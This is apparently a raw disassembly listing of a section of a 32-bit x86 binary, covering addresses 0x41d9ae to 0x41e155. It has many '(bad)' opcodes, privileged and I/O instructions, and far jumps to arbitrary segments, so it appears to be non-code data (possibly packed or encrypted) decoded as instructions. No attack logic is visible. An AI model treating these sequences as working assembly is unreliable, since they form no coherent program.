  41d9ae:	test   DWORD PTR [ebx+0x18fdbc93],ebx
  41d9b4:	jle    0x41da0a
  41d9b6:	push   edi
  41d9b7:	loop   0x41d997
  41d9b9:	or     BYTE PTR [esi+0x3335e02e],al
  41d9bf:	or     DWORD PTR [eax-0x61],0xe9bbcc91
  41d9c6:	cld    
  41d9c7:	popf   
  41d9c8:	jno    0x41d991
  41d9ca:	mov    ecx,0xa3fb10de
  41d9cf:	neg    ebx
  41d9d1:	xchg   esp,eax
  41d9d2:	pop    eax
  41d9d3:	ficom  DWORD PTR [ebx+ebp*8-0x4cfcdffd]
  41d9da:	shr    bh,1
  41d9dc:	ins    BYTE PTR es:[edi],dx
  41d9dd:	nop    DWORD PTR [esi*8+0x19ee0ab0]
  41d9e5:	mov    ah,0xdd
  41d9e7:	xchg   ebp,eax
  41d9e8:	ror    ebp,0x76
  41d9eb:	stos   DWORD PTR es:[edi],eax
  41d9ec:	imul   eax
  41d9ee:	call   0x66b7:0x20b3a648
  41d9f5:	push   esi
  41d9f6:	add    BYTE PTR [edi],al
  41d9f8:	sbb    dl,cl
  41d9fa:	daa    
  41d9fb:	pop    edi
  41d9fc:	pop    ebp
  41d9fd:	lods   al,BYTE PTR ds:[esi]
  41d9fe:	fcomip st,st(6)
  41da00:	sub    eax,DWORD PTR [ebp-0x3e]
  41da03:	imul   esp,DWORD PTR [ebx+0x20],0xffffff91
  41da07:	stos   BYTE PTR es:[edi],al
  41da08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da09:	int    0xc8
  41da0b:	iret   
  41da0c:	js     0x41d9a6
  41da0e:	jmp    FWORD PTR [ebp+0x1c5459c9]
  41da14:	sbb    ebp,DWORD PTR [ebx]
  41da16:	xor    eax,0x73b90f3f
  41da1b:	setbe  BYTE PTR [edi]
  41da1e:	sbb    BYTE PTR [ecx-0x37],ch
  41da21:	sar    BYTE PTR [edi+0x53],1
  41da24:	mov    dl,0x36
  41da26:	addr16 push cs
  41da28:	out    0xb5,eax
  41da2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da2b:	retf   0xb76f
  41da2e:	into   
  41da2f:	sbb    DWORD PTR [ebp-0x75],edx
  41da32:	inc    edx
  41da33:	loopne 0x41da5e
  41da35:	push   0xffffffdf
  41da37:	fistp  QWORD PTR [edx+0x2cb1ee2a]
  41da3d:	fsubr  QWORD PTR [esi]
  41da3f:	xor    ebp,edi
  41da41:	ret    0xcdc9
  41da44:	mov    ds:0xb374cbdf,eax
  41da49:	jo     0x41da6d
  41da4b:	outs   dx,BYTE PTR ds:[esi]
  41da4c:	lods   al,BYTE PTR ds:[esi]
  41da4d:	scas   eax,DWORD PTR es:[edi]
  41da4e:	jge    0x41d9f0
  41da50:	jl     0x41d9fd
  41da52:	(bad)  
  41da53:	std    
  41da54:	xor    BYTE PTR [edi+0x2cd704f0],0x18
  41da5b:	in     al,dx
  41da5c:	movmskps esi,xmm3
  41da5f:	aam    0x6c
  41da61:	lahf   
  41da62:	sub    eax,0x51738963
  41da67:	iret   
  41da68:	stc    
  41da69:	std    
  41da6a:	ret    
  41da6b:	test   DWORD PTR [edx],0x3c213b2b
  41da71:	pusha  
  41da72:	pushf  
  41da73:	mov    ch,0xab
  41da75:	push   edi
  41da76:	dec    edx
  41da77:	xor    eax,0x65b6ebe8
  41da7c:	cmp    DWORD PTR [edi],esi
  41da7e:	adc    al,0x93
  41da80:	dec    esi
  41da81:	inc    esp
  41da82:	push   edi
  41da83:	pop    ecx
  41da84:	cmp    eax,0x7a9510d5
  41da89:	pop    eax
  41da8a:	sub    al,0x87
  41da8c:	call   0x1f79:0x7e017107
  41da93:	jo     0x41db00
  41da95:	cdq    
  41da96:	or     eax,0x7f858e24
  41da9b:	jbe    0x41da2e
  41da9d:	rcr    BYTE PTR [ecx-0x6a],0x37
  41daa1:	sbb    ch,BYTE PTR [eax+ecx*1]
  41daa4:	ins    BYTE PTR es:[edi],dx
  41daa5:	push   eax
  41daa6:	mov    cl,0x14
  41daa8:	ret    0x1879
  41daab:	adc    DWORD PTR [edi-0x2672f4e4],ebp
  41dab1:	lahf   
  41dab2:	js     0x41dab0
  41dab4:	dec    edi
  41dab5:	not    DWORD PTR [esi-0x14d4748c]
  41dabb:	shl    BYTE PTR [ebp+0x31],cl
  41dabe:	enter  0xe4ac,0x94
  41dac2:	pop    edi
  41dac3:	in     eax,dx
  41dac4:	stc    
  41dac5:	xor    eax,DWORD PTR ds:0x176e8e5
  41dacb:	sub    al,0xd0
  41dacd:	push   ebp
  41dace:	rol    DWORD PTR [ebx-0x49],1
  41dad1:	fdivr  DWORD PTR ds:0x259e1cf5
  41dad7:	and    BYTE PTR [ecx+0x18],bh
  41dada:	xchg   ebx,eax
  41dadb:	inc    ecx
  41dadc:	dec    esp
  41dadd:	mov    edx,0xaa915a6f
  41dae2:	scas   al,BYTE PTR es:[edi]
  41dae3:	push   edi
  41dae4:	and    DWORD PTR [esi-0x1e],ecx
  41dae7:	sti    
  41dae8:	mov    WORD PTR [edi-0xe141007],ss
  41daee:	dec    ecx
  41daef:	xor    DWORD PTR [ebx],esi
  41daf1:	mov    ebx,0x9adf30dc
  41daf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41daf7:	call   0x1dc96def
  41dafc:	out    0xa1,al
  41dafe:	xchg   ebp,eax
  41daff:	sbb    al,0x9
  41db01:	mov    ds:0xef2ed5c4,eax
  41db06:	sbb    DWORD PTR [edx+0x11804b0e],0x32588fb
  41db10:	jg     0x41db8a
  41db12:	cmp    al,0x7f
  41db14:	xor    DWORD PTR [esi+0x219fdf02],0xffffffc3
  41db1b:	imul   edi,DWORD PTR [ebx+eiz*4+0x7f],0x4
  41db20:	mov    eax,ds:0xfee0120c
  41db25:	or     BYTE PTR [edx+0x337f3268],al
  41db2b:	jmp    0xd634:0xe03c10b
  41db32:	adc    BYTE PTR [esp+ebx*4],al
  41db35:	sbb    DWORD PTR [edx+0x5fa0dc9d],0xffffffe3
  41db3c:	enter  0x83bb,0x93
  41db40:	std    
  41db41:	call   0x11adf041
  41db46:	shl    DWORD PTR [edx],1
  41db48:	xor    DWORD PTR [esi+0xfc0ba06],ecx
  41db4e:	in     al,dx
  41db4f:	test   al,0x7a
  41db51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db52:	iret   
  41db53:	lods   al,BYTE PTR ds:[esi]
  41db54:	es inc esi
  41db56:	stc    
  41db57:	mov    al,0x6b
  41db59:	gs jmp 0xe90e30b4
  41db5f:	sub    DWORD PTR [ebp+0x68],esi
  41db62:	or     BYTE PTR [eax-0x54],0xe7
  41db66:	ret    
  41db67:	mov    ds:0xa9cfc8d6,eax
  41db6c:	pop    edi
  41db6d:	aas    
  41db6e:	(bad)  
  41db6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db70:	sti    
  41db71:	popa   
  41db72:	fistp  QWORD PTR [eax]
  41db74:	inc    edi
  41db75:	jae    0x41db3b
  41db77:	enter  0x6e9b,0xde
  41db7b:	hlt    
  41db7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db7d:	sti    
  41db7e:	(bad)  
  41db7f:	shl    BYTE PTR [esp+edx*1-0x4a],cl
  41db83:	icebp  
  41db84:	clc    
  41db85:	cdq    
  41db86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db87:	(bad)  
  41db88:	out    dx,al
  41db89:	add    DWORD PTR [edx-0x22ab75c],esi
  41db8f:	sbb    esp,0x6e49e2ce
  41db95:	cpuid  
  41db97:	addr16 hlt 
  41db99:	jecxz  0x41dbcf
  41db9b:	ins    BYTE PTR es:[edi],dx
  41db9c:	int    0x12
  41db9e:	add    al,0x80
  41dba0:	xchg   esp,eax
  41dba1:	loopne 0x41db6d
  41dba3:	xchg   edx,eax
  41dba4:	fidiv  WORD PTR [ecx+ebp*4]
  41dba7:	in     al,dx
  41dba8:	mov    ecx,0x49d26fda
  41dbad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbae:	jp     0x41db77
  41dbb0:	ds out dx,al
  41dbb2:	push   cs
  41dbb3:	shl    BYTE PTR [esi+0x4e],cl
  41dbb6:	loope  0x41dc24
  41dbb8:	or     DWORD PTR [esi+0x19],0x6f
  41dbbc:	je     0x41dba9
  41dbbe:	pop    esp
  41dbbf:	lods   al,BYTE PTR ds:[esi]
  41dbc0:	in     al,0x9f
  41dbc2:	sbb    BYTE PTR [eax],bl
  41dbc4:	jle    0x41db5d
  41dbc6:	loopne 0x41db80
  41dbc8:	jecxz  0x41dc3f
  41dbca:	mov    eax,ds:0x2343bfc5
  41dbcf:	xchg   edi,eax
  41dbd0:	cmc    
  41dbd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbd2:	add    DWORD PTR [edi-0x72],ecx
  41dbd5:	sub    edx,DWORD PTR [esi+0x3a7a93e9]
  41dbdb:	mov    dh,0x7a
  41dbdd:	cli    
  41dbde:	or     eax,0xbac2b548
  41dbe3:	fcmovu st,st(6)
  41dbe5:	cmp    ebp,DWORD PTR [edi+0x17]
  41dbe8:	xchg   ebx,eax
  41dbe9:	sti    
  41dbea:	jge    0x41dbe3
  41dbec:	and    ebp,ebx
  41dbee:	shl    DWORD PTR [ebp+0x5bc3d29c],cl
  41dbf4:	fcomp  st(4)
  41dbf6:	ret    
  41dbf7:	sub    BYTE PTR [ebx],cl
  41dbf9:	ret    0x999d
  41dbfc:	ins    DWORD PTR es:[edi],dx
  41dbfd:	xchg   edx,eax
  41dbfe:	mov    esi,0x232343ec
  41dc03:	jb     0x41db87
  41dc05:	cmc    
  41dc06:	mov    dh,0x1a
  41dc08:	push   ebx
  41dc09:	ret    
  41dc0a:	es mov ecx,0x487a274e
  41dc10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc11:	adc    eax,0xf281557b
  41dc16:	in     eax,0x1c
  41dc18:	ds pop ds
  41dc1a:	add    bh,BYTE PTR [esi-0x3261f72c]
  41dc20:	int3   
  41dc21:	in     eax,dx
  41dc22:	(bad)  
  41dc23:	imul   edx,DWORD PTR [ecx],0xfffffffb
  41dc26:	data16 loop 0x41dbfb
  41dc29:	cmp    bl,BYTE PTR [edx-0x4c]
  41dc2c:	push   cs
  41dc2d:	push   cs
  41dc2e:	xor    ecx,DWORD PTR [ebx+0x4b0f956f]
  41dc34:	xchg   edx,edx
  41dc36:	push   ebp
  41dc37:	xchg   ecx,ebp
  41dc39:	push   esi
  41dc3a:	ret    
  41dc3b:	fdiv   DWORD PTR [eax+0x3232898d]
  41dc41:	adc    eax,eax
  41dc43:	jecxz  0x41dc84
  41dc45:	and    BYTE PTR [edi-0x7172b68b],dh
  41dc4b:	pushf  
  41dc4c:	sbb    ebp,DWORD PTR [ebx-0x10]
  41dc4f:	ret    
  41dc50:	imul   esi,DWORD PTR [eax-0x31],0x1f
  41dc54:	mov    ds:0xfc390425,eax
  41dc59:	pop    es
  41dc5a:	mov    bl,BYTE PTR [esi-0x46]
  41dc5d:	jl     0x41dc79
  41dc5f:	inc    edi
  41dc60:	or     al,0xd8
  41dc62:	sbb    eax,0xbc6e6374
  41dc67:	push   ss
  41dc68:	(bad)  
  41dc69:	adc    ebx,DWORD PTR [ebp-0x5f]
  41dc6c:	jl     0x41dccd
  41dc6e:	test   BYTE PTR [edi+edi*2-0x4e12aa45],dh
  41dc75:	ret    0xcc2d
  41dc78:	out    dx,eax
  41dc79:	pop    eax
  41dc7a:	test   al,0xa4
  41dc7c:	push   cs
  41dc7d:	shl    BYTE PTR [ecx-0xc80e404],cl
  41dc83:	add    BYTE PTR [ebp+0x76073c0e],dh
  41dc89:	inc    esp
  41dc8a:	test   DWORD PTR ds:0x8639760e,eax
  41dc90:	or     edx,edx
  41dc92:	push   ebx
  41dc93:	xor    eax,0x18e6c67c
  41dc98:	test   DWORD PTR [edx],ebx
  41dc9a:	test   eax,0x6d49dbf1
  41dc9f:	push   esi
  41dca0:	les    edx,FWORD PTR [esi]
  41dca2:	loop   0x41dcb0
  41dca4:	mov    esi,ecx
  41dca6:	jnp    0x41dd0f
  41dca8:	mul    BYTE PTR [edx+ebx*2-0x59]
  41dcac:	push   es
  41dcad:	ja     0x41dcac
  41dcaf:	xchg   esi,eax
  41dcb0:	ror    DWORD PTR [ebx-0x70],1
  41dcb3:	push   ebp
  41dcb4:	mov    eax,0x1dc844a8
  41dcb9:	jne    0x41dc89
  41dcbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcbc:	aas    
  41dcbd:	or     ebx,esi
  41dcbf:	(bad)  
  41dcc0:	out    0xb6,eax
  41dcc2:	xor    DWORD PTR [edx+ebx*8],esi
  41dcc5:	mov    BYTE PTR [ebp+0x8],0x8d
  41dcc9:	sbb    edx,DWORD PTR [ebp+eiz*1+0x9d0c8ef]
  41dcd0:	popf   
  41dcd1:	sub    al,dh
  41dcd3:	sbb    ebp,esi
  41dcd5:	xor    eax,0x4c76132c
  41dcda:	adc    dh,cl
  41dcdc:	and    edi,DWORD PTR [ecx+ebx*2+0x37]
  41dce0:	aaa    
  41dce1:	add    eax,eax
  41dce3:	push   ss
  41dce4:	adc    ebx,edx
  41dce6:	mov    eax,0x93119770
  41dceb:	bound  esi,QWORD PTR [edx+0x3e]
  41dcee:	cli    
  41dcef:	xchg   BYTE PTR [edx-0x51b047f1],al
  41dcf5:	mov    eax,0xd4d71c49
  41dcfa:	loopne 0x41dcaa
  41dcfc:	mov    eax,ds:0xca5ac147
  41dd01:	add    DWORD PTR [ebx-0x6a],ecx
  41dd04:	mov    ah,0xc6
  41dd06:	cs push edx
  41dd08:	ret    0x7082
  41dd0b:	ret    
  41dd0c:	std    
  41dd0d:	dec    eax
  41dd0e:	mov    ds:0x2921421c,eax
  41dd13:	mov    es,esi
  41dd15:	ror    DWORD PTR [eax],1
  41dd17:	scas   al,BYTE PTR es:[edi]
  41dd18:	call   0xfac7:0xf2a6e2cc
  41dd1f:	xchg   esp,eax
  41dd20:	xchg   DWORD PTR [ecx+ebx*4-0x2a],edx
  41dd24:	leave  
  41dd25:	enter  0x143c,0x3d
  41dd29:	adc    dh,BYTE PTR [edi+edx*2-0x61]
  41dd2d:	es sub dh,ch
  41dd30:	sub    eax,0x661bd22a
  41dd35:	cmp    DWORD PTR [eax-0x30f4aa64],eax
  41dd3b:	fdivr  QWORD PTR [edi]
  41dd3d:	mov    al,ds:0x8ee74af0
  41dd42:	dec    esi
  41dd43:	in     al,0xb1
  41dd45:	mov    eax,ds:0xeb4345c1
  41dd4a:	pop    ebx
  41dd4b:	fst    QWORD PTR [edi]
  41dd4d:	lahf   
  41dd4e:	icebp  
  41dd4f:	jecxz  0x41dce1
  41dd51:	fidiv  WORD PTR [edi-0x5e32f0ac]
  41dd57:	fdivr  DWORD PTR ds:0x544dda3b
  41dd5d:	ja     0x41dd2c
  41dd5f:	pop    ds
  41dd60:	pop    ebp
  41dd61:	push   es
  41dd62:	leave  
  41dd63:	inc    ecx
  41dd64:	dec    ecx
  41dd65:	bound  edx,QWORD PTR [eax+0x729e8f5f]
  41dd6b:	test   BYTE PTR ds:0x29d7c16b,ah
  41dd71:	test   BYTE PTR cs:[edi+ecx*8-0x3b],0x9f
  41dd77:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41dd79:	and    eax,0xfc20a035
  41dd7e:	pop    esi
  41dd7f:	xchg   ecx,eax
  41dd80:	daa    
  41dd81:	aas    
  41dd82:	je     0x41ddcd
  41dd84:	mov    ecx,0xc3de6233
  41dd89:	push   edi
  41dd8a:	ss cmc 
  41dd8c:	aad    0x55
  41dd8e:	in     al,0x26
  41dd90:	push   ds
  41dd91:	mov    al,0xf9
  41dd93:	cdq    
  41dd94:	out    dx,eax
  41dd95:	adc    BYTE PTR [ebp+eax*1-0x24b578ea],al
  41dd9c:	inc    eax
  41dd9d:	stc    
  41dd9e:	loopne 0x41de18
  41dda0:	loope  0x41dd7f
  41dda2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dda3:	test   DWORD PTR [eax-0x76cfafe],ebp
  41dda9:	mov    bl,0x2
  41ddab:	loope  0x41dde3
  41ddad:	fmul   st,st(7)
  41ddaf:	sbb    dh,BYTE PTR [esi-0x4d]
  41ddb2:	dec    edx
  41ddb3:	xchg   edx,eax
  41ddb4:	out    dx,ax
  41ddb6:	push   esp
  41ddb7:	(bad)  
  41ddb8:	xor    al,0xc7
  41ddba:	lods   eax,DWORD PTR ds:[esi]
  41ddbb:	push   ss
  41ddbc:	shl    BYTE PTR [ecx+0x6a],1
  41ddbf:	jno    0x41dda3
  41ddc1:	pop    ecx
  41ddc2:	hlt    
  41ddc3:	sbb    esi,DWORD PTR [ecx+eax*1]
  41ddc6:	dec    esp
  41ddc7:	lea    edx,[esi]
  41ddc9:	push   0x30
  41ddcb:	mov    ecx,0xb24012d
  41ddd0:	mov    fs,eax
  41ddd2:	shr    bl,0x58
  41ddd5:	mov    dh,0x95
  41ddd7:	push   edi
  41ddd8:	mov    edx,0x20089174
  41dddd:	inc    ecx
  41ddde:	in     eax,0x26
  41dde0:	stos   DWORD PTR es:[di],eax
  41dde2:	stc    
  41dde3:	test   ah,dh
  41dde5:	fbld   TBYTE PTR [ebx-0x394b122]
  41ddeb:	inc    edi
  41ddec:	pop    ebp
  41dded:	mov    DWORD PTR [ebp+0x20ac63e9],ecx
  41ddf3:	jmp    0xec6e:0x38b8dc6f
  41ddfa:	jmp    0x89eb5792
  41ddff:	iret   
  41de00:	hlt    
  41de01:	addr16 enter 0xad80,0x30
  41de06:	nop
  41de07:	push   edi
  41de08:	mov    al,ds:0xbb900ec1
  41de0d:	push   eax
  41de0e:	outs   dx,DWORD PTR ds:[esi]
  41de0f:	and    al,0x8e
  41de11:	jl     0x41ddcb
  41de13:	xchg   ebp,edx
  41de15:	add    edi,DWORD PTR [edx+0xa19c97f]
  41de1b:	cwde   
  41de1c:	mov    fs,WORD PTR [edi-0x5de8d54b]
  41de22:	xor    bl,BYTE PTR ds:0xc5aac496
  41de28:	mov    esi,0x715e416d
  41de2d:	cmp    edi,DWORD PTR [edi+edx*1]
  41de30:	ret    
  41de31:	jmp    0xcee37d75
  41de36:	dec    edx
  41de37:	ret    0x9f8f
  41de3a:	dec    eax
  41de3b:	shl    BYTE PTR [edi],1
  41de3d:	xor    eax,0xe7d0576f
  41de42:	pop    eax
  41de43:	fcomp  st(1)
  41de45:	add    BYTE PTR ds:0x77a4f991,al
  41de4b:	mov    dl,0xbf
  41de4d:	push   0x3f
  41de4f:	cmp    esi,DWORD PTR [ebx]
  41de51:	mov    eax,ds:0x753e1430
  41de56:	test   eax,0x393518c6
  41de5b:	jle    0x41de26
  41de5d:	(bad)  
  41de5e:	push   esp
  41de5f:	stc    
  41de60:	mov    dl,0x74
  41de62:	push   0x26
  41de64:	fadd   QWORD PTR [eax-0xd058e26]
  41de6a:	test   DWORD PTR [edi+0x47462868],0xa65b6e46
  41de74:	mov    ebx,0xf6d5835a
  41de79:	pop    edi
  41de7a:	rcl    BYTE PTR [ebx+ebp*4],1
  41de7d:	sub    edx,eax
  41de7f:	pop    edx
  41de80:	cs jae 0x41deaa
  41de83:	xchg   ebx,eax
  41de84:	and    DWORD PTR [esi-0x4bd31f17],edi
  41de8a:	arpl   WORD PTR [edx+edi*8-0x45063d56],bp
  41de91:	mov    edi,DWORD PTR [edx-0x20]
  41de94:	call   0xd7d1:0x7ee0e604
  41de9b:	das    
  41de9c:	lods   al,BYTE PTR ds:[esi]
  41de9d:	or     BYTE PTR [ebx+edx*4],dh
  41dea0:	aaa    
  41dea1:	inc    eax
  41dea2:	pop    dx
  41dea4:	retf   
  41dea5:	dec    ebp
  41dea6:	cmp    BYTE PTR [esp+edi*1],al
  41dea9:	into   
  41deaa:	fisub  DWORD PTR ds:0xa0a773b8
  41deb0:	in     eax,dx
  41deb1:	lock fdiv QWORD PTR [ebp-0xb42c17e]
  41deb8:	add    BYTE PTR [ecx+0x7],dl
  41debb:	pop    ss
  41debc:	sbb    DWORD PTR [edi],esi
  41debe:	out    0xae,eax
  41dec0:	mov    dl,0xc4
  41dec2:	into   
  41dec3:	clc    
  41dec4:	sub    ah,BYTE PTR [ebx-0x1a]
  41dec7:	dec    eax
  41dec8:	jno    0x41df13
  41deca:	pop    eax
  41decb:	cli    
  41decc:	mov    al,0x63
  41dece:	les    ebp,FWORD PTR [ebx+0x31]
  41ded1:	jns    0x41deeb
  41ded3:	imul   edx,esi,0x1d377ce1
  41ded9:	or     al,0xed
  41dedb:	or     BYTE PTR [ebx+0x40],ch
  41dede:	cmp    BYTE PTR [ebx+0x238b8296],dl
  41dee4:	sbb    eax,0x8e0e1582
  41dee9:	das    
  41deea:	ficomp WORD PTR [ecx]
  41deec:	pop    esp
  41deed:	pop    es
  41deee:	arpl   WORD PTR [edi-0xe3c4799],di
  41def4:	inc    ebx
  41def5:	idiv   DWORD PTR [esi+0x659f1f5d]
  41defb:	mov    edi,fs
  41defd:	mov    edx,0xc868be55
  41df02:	or     al,0xa6
  41df04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df05:	rcl    edx,1
  41df07:	adc    BYTE PTR [ebp-0x3a62d542],dh
  41df0d:	pop    DWORD PTR ds:0x22faf349
  41df13:	and    ah,BYTE PTR [ecx-0x61]
  41df16:	iret   
  41df17:	jmp    0x41df04
  41df19:	xchg   esi,eax
  41df1a:	test   eax,0xf2712298
  41df1f:	imul   ecx,edx,0x2a4c4ab8
  41df25:	pusha  
  41df26:	js     0x41debf
  41df28:	sub    BYTE PTR [ebx+0x6b],cl
  41df2b:	xor    BYTE PTR [ecx+esi*1],bh
  41df2e:	jmp    0xda24:0xa4a7635c
  41df35:	sub    eax,0x3215afe
  41df3a:	fcmovu st,st(3)
  41df3c:	(bad)  
  41df3d:	mov    ecx,0x6eacb6cb
  41df42:	push   0xfffffffc
  41df44:	jmp    0x987aabd1
  41df49:	imul   ebp,eax,0xb12c2f8a
  41df4f:	add    bh,BYTE PTR [ebp+0x6a]
  41df52:	(bad)  
  41df53:	(bad)  
  41df55:	sti    
  41df56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df57:	sub    BYTE PTR [edi+0x3c],dh
  41df5a:	mov    edi,0x49786b04
  41df5f:	mov    eax,0x117d7b2a
  41df64:	push   esp
  41df65:	call   0xa5d3:0x4b947d8a
  41df6c:	data16 mov al,ds:0xfd4fae63
  41df72:	pop    ds
  41df73:	xlat   BYTE PTR ds:[ebx]
  41df74:	enter  0xf80c,0x30
  41df78:	jle    0x41df11
  41df7a:	jo     0x41df11
  41df7c:	je     0x41df30
  41df7e:	cwde   
  41df7f:	aaa    
  41df80:	and    bh,BYTE PTR [edx]
  41df82:	adc    BYTE PTR cs:[ebx+0x7b],ah
  41df86:	jecxz  0x41dfbf
  41df88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df89:	sbb    cl,dh
  41df8b:	push   0xe1fed50c
  41df90:	fild   DWORD PTR [ebx-0x57438a42]
  41df96:	imul   ebx,ebx,0xffffff9a
  41df99:	imul   BYTE PTR [edi]
  41df9b:	jae    0x41dffa
  41df9d:	daa    
  41df9e:	(bad)  
  41df9f:	gs ret 0x2f0
  41dfa3:	and    eax,DWORD PTR [ebp+0x6ef82304]
  41dfa9:	sub    eax,0x2638a2a0
  41dfae:	mov    eax,0x2f99adea
  41dfb3:	cmp    dh,BYTE PTR [esi+0x457bf61e]
  41dfb9:	hlt    
  41dfba:	xor    bl,ah
  41dfbc:	xchg   esp,eax
  41dfbd:	cld    
  41dfbe:	mov    ?,ecx
  41dfc0:	and    bl,BYTE PTR [ecx]
  41dfc2:	and    DWORD PTR [ecx],esi
  41dfc4:	jns    0x41e004
  41dfc6:	jl     0x41df7f
  41dfc8:	aam    0x14
  41dfca:	pusha  
  41dfcb:	imul   edi,DWORD PTR [ecx+ecx*8],0xd1bb98d6
  41dfd2:	cmovg  esi,DWORD PTR ds:0x4ffdb585
  41dfd9:	imul   esi,DWORD PTR [ebp-0x2ed254b7],0xffffffbc
  41dfe0:	and    DWORD PTR [esi+esi*4],edx
  41dfe3:	dec    esi
  41dfe4:	loopne 0x41dfb5
  41dfe6:	mov    bh,BYTE PTR [edx+0x4312dd81]
  41dfec:	cwde   
  41dfed:	mov    edx,DWORD PTR [ebp+0xc]
  41dff0:	pop    ds
  41dff1:	mov    eax,?
  41dff3:	retf   0x7323
  41dff6:	test   ebp,0x5bd2961a
  41dffc:	inc    eax
  41dffd:	fdiv   QWORD PTR [ecx]
  41dfff:	mov    cl,0xd9
  41e001:	add    DWORD PTR [edx],ebp
  41e003:	push   es
  41e004:	ficomp DWORD PTR [edi-0x7e777642]
  41e00a:	ret    
  41e00b:	lds    ebx,FWORD PTR [ebx]
  41e00d:	scas   eax,DWORD PTR es:[edi]
  41e00e:	fwait
  41e00f:	pushf  
  41e010:	(bad)  
  41e011:	pop    DWORD PTR [ecx-0x6c]
  41e014:	mov    esp,esi
  41e016:	call   0x92e5:0x662283ee
  41e01d:	inc    ecx
  41e01e:	ja     0x41dfaa
  41e020:	push   es
  41e021:	mov    bl,0xdd
  41e023:	jnp    0x41dfc0
  41e025:	inc    edx
  41e026:	enter  0xbaba,0xc7
  41e02a:	ins    BYTE PTR es:[edi],dx
  41e02b:	pop    ebx
  41e02c:	xchg   esi,eax
  41e02d:	adc    eax,0x2f530b4c
  41e032:	shr    DWORD PTR [edx-0x4466019b],1
  41e038:	test   eax,0xc189141c
  41e03d:	les    edx,FWORD PTR [eax+0x62468f1c]
  41e043:	(bad)  
  41e044:	jno    0x41e04d
  41e046:	pop    eax
  41e047:	jne    0x41e08c
  41e049:	pop    eax
  41e04a:	rol    BYTE PTR [ebx-0x1310701f],cl
  41e050:	out    dx,al
  41e051:	cmp    bl,BYTE PTR ds:0x31bc461b
  41e057:	xor    BYTE PTR [edx],cl
  41e059:	xchg   edi,eax
  41e05a:	(bad)  
  41e05b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e05c:	dec    eax
  41e05d:	mov    bl,0x1d
  41e05f:	scas   al,BYTE PTR es:[edi]
  41e060:	call   0x7785:0xa496c288
  41e067:	mov    BYTE PTR [edi],dl
  41e069:	push   ds
  41e06a:	adc    edx,DWORD PTR [eax+edi*1-0x34]
  41e06e:	sbb    eax,0xa99485c8
  41e073:	pop    eax
  41e074:	mov    al,gs:0x6c59f304
  41e07a:	cmp    eax,0x1e8b1009
  41e07f:	mov    edx,0x6d589e5e
  41e084:	xor    cl,BYTE PTR [esi+0x6]
  41e087:	pop    ds
  41e088:	mov    BYTE PTR [edx-0x49],bl
  41e08b:	and    bl,BYTE PTR [eax-0x4e]
  41e08e:	dec    ebx
  41e08f:	mov    edi,0xe444046b
  41e094:	add    bl,BYTE PTR [ebx+0x730fd112]
  41e09a:	out    0x2,eax
  41e09c:	or     al,0x16
  41e09e:	popf   
  41e09f:	aas    
  41e0a0:	sub    BYTE PTR [ebp+0x3a54890c],0x43
  41e0a7:	cld    
  41e0a8:	adc    eax,0x4356cea8
  41e0ad:	jns    0x41e0cf
  41e0af:	sbb    DWORD PTR ds:0x46215b54,ecx
  41e0b5:	or     eax,0x92f5eb3
  41e0ba:	ret    
  41e0bb:	and    DWORD PTR [edx+ebp*1],edx
  41e0be:	aas    
  41e0bf:	aas    
  41e0c0:	rcl    DWORD PTR [edx-0x3a510e5e],0xb4
  41e0c7:	push   0xcdddbe79
  41e0cc:	jg     0x41e12b
  41e0ce:	(bad)  
  41e0cf:	repnz scas al,BYTE PTR es:[edi]
  41e0d1:	enter  0x5b06,0x41
  41e0d5:	leave  
  41e0d6:	push   0xb8e658df
  41e0db:	loopne 0x41e07f
  41e0dd:	mov    ecx,0xaeffc974
  41e0e2:	popa   
  41e0e3:	cli    
  41e0e4:	sub    ebp,DWORD PTR [edi-0x551a6824]
  41e0ea:	add    esi,edi
  41e0ec:	mov    bh,0xea
  41e0ee:	addr16 xor eax,0xbc18c797
  41e0f4:	inc    esp
  41e0f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0f6:	les    esp,FWORD PTR [ebx+0x6c]
  41e0f9:	sti    
  41e0fa:	cwde   
  41e0fb:	shl    ch,1
  41e0fd:	mov    cl,0x93
  41e0ff:	fs push esi
  41e101:	retf   0x107
  41e104:	jbe    0x41e0b4
  41e106:	cmp    al,BYTE PTR [ebx]
  41e108:	fscale 
  41e10a:	inc    esi
  41e10b:	xchg   ebp,eax
  41e10c:	out    0xba,al
  41e10e:	add    BYTE PTR [ebp+ecx*4-0x32],ch
  41e112:	retf   0xfc57
  41e115:	fs repz inc edi
  41e118:	out    dx,eax
  41e119:	push   esp
  41e11a:	push   0xffffff99
  41e11c:	pop    ebx
  41e11d:	jl     0x41e0fb
  41e11f:	aas    
  41e120:	ins    DWORD PTR es:[edi],dx
  41e121:	xchg   BYTE PTR [ebx-0x8],bl
  41e124:	sbb    dl,BYTE PTR [edi+0x6d985e88]
  41e12a:	pop    eax
  41e12b:	sbb    BYTE PTR [edx-0x276da715],cl
  41e131:	jmp    0x4124490c
  41e136:	(bad)  
  41e137:	or     dl,BYTE PTR [eax]
  41e139:	ss mov esp,edi
  41e13c:	dec    edx
  41e13d:	idiv   BYTE PTR [ebp+0xacf6fe6]
  41e143:	cmp    BYTE PTR [edx],bh
  41e145:	bound  edx,QWORD PTR [ecx+0x173cc848]
  41e14b:	inc    ebx
  41e14c:	and    eax,0xa3cbb71b
  41e151:	sbb    al,0xfc
  41e153:	dec    edx
  41e154:	inc    eax
  41e155:	mov    bh,0x57
